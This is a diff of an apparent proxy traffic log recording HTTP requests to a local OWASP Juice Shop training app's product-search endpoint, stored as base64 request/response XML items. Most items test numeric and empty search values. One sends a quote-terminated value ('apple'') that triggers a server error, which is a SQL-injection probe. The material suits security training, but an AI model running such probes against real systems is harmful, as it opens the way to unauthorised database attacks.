+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPSBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjkwMDANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKg0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTAuMC4wLjAgU2FmYXJpLzUzNy4zNg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IGNvcnMNClNlYy1GZXRjaC1EZXN0OiBlbXB0eQ0KUmVmZXJlcjogaHR0cDovL2xvY2FsaG9zdDo5MDAwLw0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KSWYtTm9uZS1NYXRjaDogVy8iNDBiMy12ZnFDQ0JtRlJrZXhINFBmRlNzQlFNNld0bTgiDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyI0MGIzLXZmcUNDQm1GUmtleEg0UGZGU3NCUU02V3RtOCINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:31:22 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPSBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjkwMDANCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpzZWMtY2gtdWEtbW9iaWxlOiA/MA0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiV2luZG93cyINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTAuMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IHdlbGNvbWViYW5uZXJfc3RhdHVzPWRpc21pc3M7IGNvb2tpZWNvbnNlbnRfc3RhdHVzPWRpc21pc3M7IGNvbnRpbnVlQ29kZT02N2d3ckpXWjdsZVJFb0R5TmI0MU9WcFE4R212U2pqaG56MHZ6WEszeGpxNjVNa0xCbmE5Mm1ZUGdqcjk7IGxhbmd1YWdlPWVuDQpJZi1Ob25lLU1hdGNoOiBXLyI0MGIzLXZmcUNDQm1GUmtleEg0UGZGU3NCUU02V3RtOCINCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyI0MGIzLXZmcUNDQm1GUmtleEg0UGZGU3NCUU02V3RtOCINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDE6MjIgR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:51 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=-999]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=-999]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPS05OTkgSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWE6ICJOb3Q7QT1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTUwIg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KSWYtTm9uZS1NYXRjaDogVy8iMWUtSmtQY0krcEdqN0JCVHhPdVpUVlZJbTkxemFZIg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>304</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxZS1Ka1BjSStwR2o3QkJUeE91WlRWVkltOTF6YVkiDQpEYXRlOiBUaHUsIDAzIFNlcCAyMDI2IDE4OjAwOjUxIEdNVA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KS2VlcC1BbGl2ZTogdGltZW91dD01DQoNCg==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:38 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=0]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=0]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPTAgSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWE6ICJOb3Q7QT1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTUwIg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KSWYtTm9uZS1NYXRjaDogVy8iMjI1MS00RkVCRWZZdWxUMFdJR1V4MklzWnRDZ0UrSVUiDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIyMjUxLTRGRUJFZll1bFQwV0lHVXgySXNadENnRStJVSINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MzggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:31:01 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=999999999]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=999999999]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPTk5OTk5OTk5OSBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjkwMDANCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpzZWMtY2gtdWEtbW9iaWxlOiA/MA0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiV2luZG93cyINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTAuMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IHdlbGNvbWViYW5uZXJfc3RhdHVzPWRpc21pc3M7IGNvb2tpZWNvbnNlbnRfc3RhdHVzPWRpc21pc3M7IGNvbnRpbnVlQ29kZT02N2d3ckpXWjdsZVJFb0R5TmI0MU9WcFE4R212U2pqaG56MHZ6WEszeGpxNjVNa0xCbmE5Mm1ZUGdqcjk7IGxhbmd1YWdlPWVuDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
     <status>200</status>
-    <responselength>10370</responselength>
+    <responselength>414</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW46ICoNClgtQ29udGVudC1UeXBlLU9wdGlvbnM6IG5vc25pZmYNClgtRnJhbWUtT3B0aW9uczogU0FNRU9SSUdJTg0KRmVhdHVyZS1Qb2xpY3k6IHBheW1lbnQgJ3NlbGYnDQpYLVJlY3J1aXRpbmc6IC8jL2pvYnMNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOA0KQ29udGVudC1MZW5ndGg6IDMwDQpFVGFnOiBXLyIxZS1Ka1BjSStwR2o3QkJUeE91WlRWVkltOTF6YVkiDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDE6MDEgR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0KeyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6W119]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:31:31 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=apple%27]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=apple%27]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L3Byb2R1Y3RzL3NlYXJjaD9xPWFwcGxlJTI3IEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
+    <status>500</status>
+    <responselength>1349</responselength>
     <mimetype>HTML</mimetype>
-    <response base64="false"><![CDATA[HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Feature-Policy: payment 'self'
-X-Recruiting: /#/jobs
-Accept-Ranges: bytes
-Cache-Control: public, max-age=0
-Last-Modified: Thu, 09 Jul 2026 15:29:00 GMT
-ETag: W/"26af-19f477f1b77"
-Content-Type: text/html; charset=UTF-8
-Vary: Accept-Encoding
-Date: Thu, 09 Jul 2026 18:31:57 GMT
-Connection: keep-alive
-Keep-Alive: timeout=5
-Content-Length: 9903
-
-<!--
-  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  -->
-
-<!doctype html>
-<html lang="en" data-beasties-container>
-<head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "var(--theme-primary)", "text": "var(--theme-text)" },
-          "button": { "background": "var(--theme-accent)", "text": "var(--theme-text)" }
-        },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme{--mat-sys-background:#121316;--mat-sys-error:#ffb4ab;--mat-sys-error-container:#93000a;--mat-sys-inverse-on-surface:#2f3033;--mat-sys-inverse-primary:#005cbb;--mat-sys-inverse-surface:#e3e2e6;--mat-sys-on-background:#e3e2e6;--mat-sys-on-error:#690005;--mat-sys-on-error-container:#ffdad6;--mat-sys-on-primary:#002f65;--mat-sys-on-primary-container:#d7e3ff;--mat-sys-on-primary-fixed:#001b3f;--mat-sys-on-primary-fixed-variant:#00458f;--mat-sys-on-secondary:#283041;--mat-sys-on-secondary-container:#dae2f9;--mat-sys-on-secondary-fixed:#131c2b;--mat-sys-on-secondary-fixed-variant:#3e4759;--mat-sys-on-surface:#e3e2e6;--mat-sys-on-surface-variant:#e0e2ec;--mat-sys-on-tertiary:#173800;--mat-sys-on-tertiary-container:#82ff10;--mat-sys-on-tertiary-fixed:#0b2000;--mat-sys-on-tertiary-fixed-variant:#245100;--mat-sys-outline:#8e9099;--mat-sys-outline-variant:#44474e;--mat-sys-primary:#abc7ff;--mat-sys-primary-container:#00458f;--mat-sys-primary-fixed:#d7e3ff;--mat-sys-primary-fixed-dim:#abc7ff;--mat-sys-scrim:#000000;--mat-sys-secondary:#bec6dc;--mat-sys-secondary-container:#3e4759;--mat-sys-secondary-fixed:#dae2f9;--mat-sys-secondary-fixed-dim:#bec6dc;--mat-sys-shadow:#000000;--mat-sys-surface:#121316;--mat-sys-surface-bright:#38393c;--mat-sys-surface-container:#1f2022;--mat-sys-surface-container-high:#292a2c;--mat-sys-surface-container-highest:#343537;--mat-sys-surface-container-low:#1a1b1f;--mat-sys-surface-container-lowest:#0d0e11;--mat-sys-surface-dim:#121316;--mat-sys-surface-tint:#abc7ff;--mat-sys-surface-variant:#44474e;--mat-sys-tertiary:#70e000;--mat-sys-tertiary-container:#245100;--mat-sys-tertiary-fixed:#82ff10;--mat-sys-tertiary-fixed-dim:#70e000;--mat-sys-neutral-variant20:#2d3038;--mat-sys-neutral10:#1a1b1f;--mat-sys-level0:0px 0px 0px 0px rgba(0, 0, 0, .2), 0px 0px 0px 0px rgba(0, 0, 0, .14), 0px 0px 0px 0px rgba(0, 0, 0, .12);--mat-sys-level1:0px 2px 1px -1px rgba(0, 0, 0, .2), 0px 1px 1px 0px rgba(0, 0, 0, .14), 0px 1px 3px 0px rgba(0, 0, 0, .12);--mat-sys-level2:0px 3px 3px -2px rgba(0, 0, 0, .2), 0px 3px 4px 0px rgba(0, 0, 0, .14), 0px 1px 8px 0px rgba(0, 0, 0, .12);--mat-sys-level3:0px 3px 5px -1px rgba(0, 0, 0, .2), 0px 6px 10px 0px rgba(0, 0, 0, .14), 0px 1px 18px 0px rgba(0, 0, 0, .12);--mat-sys-level4:0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);--mat-sys-level5:0px 7px 8px -4px rgba(0, 0, 0, .2), 0px 12px 17px 2px rgba(0, 0, 0, .14), 0px 5px 22px 4px rgba(0, 0, 0, .12);--mat-sys-corner-extra-large:28px;--mat-sys-corner-extra-large-top:28px 28px 0 0;--mat-sys-corner-extra-small:4px;--mat-sys-corner-extra-small-top:4px 4px 0 0;--mat-sys-corner-full:9999px;--mat-sys-corner-large:16px;--mat-sys-corner-large-end:0 16px 16px 0;--mat-sys-corner-large-start:16px 0 0 16px;--mat-sys-corner-large-top:16px 16px 0 0;--mat-sys-corner-medium:12px;--mat-sys-corner-none:0;--mat-sys-corner-small:8px;--mat-sys-dragged-state-layer-opacity:.16;--mat-sys-focus-state-layer-opacity:.12;--mat-sys-hover-state-layer-opacity:.08;--mat-sys-pressed-state-layer-opacity:.12;color:var(--mat-sys-on-surface);background-color:var(--mat-sys-surface)}html{font-family:var(--mat-sys-body-medium-font, Roboto, "Helvetica Neue", sans-serif)}.bluegrey-lightgreen-theme{--theme-primary:#438fff;--theme-primary-lighter:rgb(97.6, 161.229787234, 255);--theme-primary-light:rgb(118, 173.3829787234, 255);--theme-primary-darker:rgb(36.4, 124.770212766, 255);--theme-primary-dark:rgb(16, 112.6170212766, 255);--theme-primary-fade-10:#438fff;--theme-primary-fade-20:#438fff;--theme-primary-fade-30:#438fff;--theme-primary-fade-40:#438fff;--theme-primary-fade-50:#438fff;--theme-accent:#50a400;--theme-accent-lighter:rgb(94.9268292683, 194.6, 0);--theme-accent-light:rgb(104.8780487805, 215, 0);--theme-accent-darker:rgb(65.0731707317, 133.4, 0);--theme-accent-dark:rgb(55.1219512195, 113, 0);--theme-accent-fade-10:#50a400;--theme-accent-fade-20:#50a400;--theme-accent-fade-30:#50a400;--theme-accent-fade-40:#50a400;--theme-accent-fade-50:#50a400;--theme-warn:#ffb4ab;--theme-warn-lighter:rgb(255, 207.3214285714, 201.6);--theme-warn-light:rgb(255, 225.5357142857, 222);--theme-warn-darker:rgb(255, 152.6785714286, 140.4);--theme-warn-dark:rgb(255, 134.4642857143, 120);--theme-warn-fade-10:#ffb4ab;--theme-warn-fade-20:#ffb4ab;--theme-warn-fade-30:#ffb4ab;--theme-warn-fade-40:#ffb4ab;--theme-warn-fade-50:#ffb4ab;--theme-text:#e3e2e6;--theme-text-lighter:rgb(242.8666666667, 242.4333333333, 244.1666666667);--theme-text-light:rgb(253.4444444444, 253.3888888889, 253.6111111111);--theme-text-darker:rgb(200.5555555556, 198.6111111111, 206.3888888889);--theme-text-dark:rgb(160.8888888889, 157.5277777778, 170.9722222222);--theme-text-fade-10:#e3e2e6;--theme-text-fade-20:#e3e2e6;--theme-text-fade-30:#e3e2e6;--theme-text-fade-40:#e3e2e6;--theme-text-fade-50:#e3e2e6;--theme-text-invert-15:rgb(197.15, 196.45, 199.25);--theme-text-invert-30:rgb(167.3, 166.9, 168.5);--theme-background:#1f2022;--theme-background-lighter:rgb(45.5938461538, 47.0646153846, 50.0061538462);--theme-background-light:rgb(55.3230769231, 57.1076923077, 60.6769230769);--theme-background-darker:rgb(16.4061538462, 16.9353846154, 17.9938461538);--theme-background-dark:rgb(6.6769230769, 6.8923076923, 7.3230769231);--theme-background-darkest:hsl(220, 4.6153846154%, -1.2549019608%);--theme-thumbnail-border:1px solid 